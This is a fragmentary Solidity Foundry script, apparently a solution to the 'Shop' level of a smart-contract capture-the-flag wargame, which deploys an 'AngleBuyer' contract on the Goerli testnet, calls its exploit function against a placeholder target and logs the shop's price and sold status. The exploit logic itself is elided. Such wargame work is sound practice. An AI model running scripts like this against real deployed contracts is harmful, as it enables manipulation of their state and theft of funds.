...
contract ShopScript is Script {
    ...
    */
    function setUp() public {
        ...
        if (chainId == 5) { //goerli chian
            ...
            target = Shop(0x0000000000000000000000000000000000000000); //attach to an existing contract
    ...
    **/
    function run() public {
        ...
        AngleBuyer buyer = new AngleBuyer();
        buyer.exploit(address(target));
        vm.stopBroadcast();
        console.log("price  : %s", target.price());
        console.log("isSold : %s", target.isSold());
    }
}